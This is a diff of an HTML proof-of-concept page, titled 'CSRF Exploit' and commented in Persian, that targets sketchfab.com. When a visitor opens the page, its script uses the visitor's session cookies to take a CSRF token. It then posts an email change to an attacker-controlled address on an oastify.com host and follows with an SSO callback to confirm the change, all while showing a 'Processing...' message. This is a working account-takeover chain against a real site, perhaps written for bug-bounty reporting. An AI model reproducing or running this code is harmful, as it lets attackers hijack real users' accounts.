@@ -1,57 +1,52 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Processing...</title>
+    <title>CSRF Exploit</title>
 </head>
 <body>
-    <h1>Please wait, processing your request...</h1>
+    <h1>Processing...</h1>
     <p id="status">Initializing...</p>
 
     <script>
-        // تابع کمکی برای تأخیر
-        const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
-
-        // تابع استخراج csrf token از صفحه HTML
-        function extractCsrfToken(htmlText) {
-            // جستجوی input مخفی با name="csrfmiddlewaretoken"
-            const regex = /<input[^>]*name=["']csrfmiddlewaretoken["'][^>]*value=["']([^"']+)["']/i;
-            const match = htmlText.match(regex);
-            if (match && match[1]) {
-                return match[1];
-            }
-            // روش جایگزین: جستجو در محتوای صفحه
-            const altRegex = /csrfmiddlewaretoken\s*:\s*["']([^"']+)["']/i;
-            const altMatch = htmlText.match(altRegex);
-            if (altMatch && altMatch[1]) return altMatch[1];
-            return null;
-        }
-
-        async function fetchCsrfTokenFromPage() {
-            const url = 'https://sketchfab.com/settings/email/';
+        // تابع استخراج sb_csrftoken از هدر Set-Cookie پاسخ
+        async function extractCsrfTokenFromSetCookie() {
+            const url = 'https://sketchfab.com/settings/email';
             const response = await fetch(url, {
                 method: 'GET',
-                credentials: 'include',   // ارسال کوکی session
+                credentials: 'include',   // ارسال کوکی‌های موجود
                 headers: {
                     'Accept': 'text/html,application/xhtml+xml'
                 }
             });
+
             if (!response.ok) {
-                throw new Error(`Failed to load page: ${response.status}`);
+                throw new Error(`HTTP ${response.status} - Failed to fetch page`);
             }
-            const html = await response.text();
-            const token = extractCsrfToken(html);
-            if (!token) {
-                throw new Error('CSRF token not found in page');
+
+            // دریافت هدر Set-Cookie
+            const setCookieHeader = response.headers.get('set-cookie');
+            if (!setCookieHeader) {
+                throw new Error('Set-Cookie header not found in response');
             }
-            return token;
+
+            // استخراج مقدار sb_csrftoken
+            // فرمت: sb_csrftoken=6iEeoOXZPvPk2IrfJJ5HcxEGhEy7rShjeyyUuTxg8trRbBQ1KrIHExP1B5qZpgVF; expires=...
+            const match = setCookieHeader.match(/sb_csrftoken=([^;]+)/);
+            if (!match || !match[1]) {
+                throw new Error('sb_csrftoken not found in Set-Cookie header');
+            }
+
+            return match[1];
         }
 
+        // تأخیر ساده
+        const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+
         // درخواست اول: تغییر ایمیل
-        async function step1_changeEmail(csrfToken) {
+        async function changeEmail(csrfToken) {
             const url = 'https://sketchfab.com/settings/email/sso-verify-callback';
-            const emailPayload = JSON.stringify({
-                "email": "pouryet3@gmail.com.gzjkg2psu523o7ao6del6o1ib9h050tp.oastify.com"
-            });
+            const email = 'pouryet3@gmail.com.gzjkg2psu523o7ao6del6o1ib9h050tp.oastify.com'; // 👈 جایگزین کن
+            const payload = JSON.stringify({ email: email });
 
             const response = await fetch(url, {
                 method: 'POST',
@@ -60,18 +55,16 @@
                     'Content-Type': 'application/json',
                     'X-Csrftoken': csrfToken
                 },
-                body: emailPayload
+                body: payload
             });
 
-            if (response.ok) {
-                const data = await response.json();
-                if (data.success === true) return true;
-            }
-            return false;
+            if (!response.ok) return false;
+            const data = await response.json();
+            return data.success === true;
         }
 
-        // درخواست دوم: تکمیل تغییر (SSO callback)
-        async function step2_confirmEmail(csrfToken) {
+        // درخواست دوم: تأیید از طریق SSO callback
+        async function confirmEmail(csrfToken) {
             const url = 'https://sketchfab.com/social/login/epic/';
             const params = new URLSearchParams({
                 'csrfmiddlewaretoken': csrfToken,
@@ -85,33 +78,31 @@
                     'Content-Type': 'application/x-www-form-urlencoded',
                 },
                 body: params,
-                redirect: 'follow'   // دنبال کردن خودکار 302
+                redirect: 'follow'   // دنبال کردن خودکار ریدایرکت 302
             });
 
-            // بررسی نهایی (حتی اگر ریدایرکت شده باشد)
             return response.redirected || response.ok;
         }
 
         // اجرای اصلی
         (async function() {
             try {
-                document.getElementById('status').innerText = 'Fetching CSRF token from page...';
-                const csrfToken = await fetchCsrfTokenFromPage();
-                console.log('[+] CSRF token obtained:', csrfToken);
-                document.getElementById('status').innerText = 'CSRF token obtained. Sending email change request...';
+                document.getElementById('status').innerText = 'Extracting CSRF token from Set-Cookie header...';
+                const csrfToken = await extractCsrfTokenFromSetCookie();
+                console.log('[+] CSRF token (sb_csrftoken) extracted:', csrfToken);
+                document.getElementById('status').innerText = 'Token extracted. Sending email change request...';
 
-                const step1 = await step1_changeEmail(csrfToken);
-                if (!step1) throw new Error('Step 1 failed');
-
+                const step1 = await changeEmail(csrfToken);
+                if (!step1) throw new Error('First POST (change email) failed');
                 document.getElementById('status').innerText = 'Email change initiated. Waiting 2 seconds...';
                 await delay(2000);
 
                 document.getElementById('status').innerText = 'Sending confirmation request...';
-                const step2 = await step2_confirmEmail(csrfToken);
-                if (!step2) throw new Error('Step 2 failed');
+                const step2 = await confirmEmail(csrfToken);
+                if (!step2) throw new Error('Second POST (confirmation) failed');
 
-                document.getElementById('status').innerText = 'Exploit completed successfully!';
-                document.body.innerHTML = '<h2 style="color:green">Done! The email has been changed.</h2>';
+                document.getElementById('status').innerText = 'Exploit completed!';
+                document.body.innerHTML = '<h2 style="color:green">Success! Email address changed.</h2>';
                 console.log('[+] Full exploit chain successful');
             } catch (err) {
                 console.error('[-] Exploit error:', err);
